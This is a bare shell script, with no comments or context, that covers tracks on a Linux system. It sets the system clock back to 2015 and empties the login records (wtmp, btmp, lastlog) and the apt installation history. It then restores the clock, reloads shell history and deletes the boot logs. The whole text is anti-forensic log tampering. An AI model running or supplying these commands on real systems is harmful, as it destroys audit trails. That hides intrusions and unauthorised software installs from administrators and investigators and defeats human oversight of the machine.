NOW=$(date) 
date -s "2015-02-12 09:09:11"
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
echo > /var/log/apt/history.log
date -s "$NOW"
history -r
rm -r boot.log*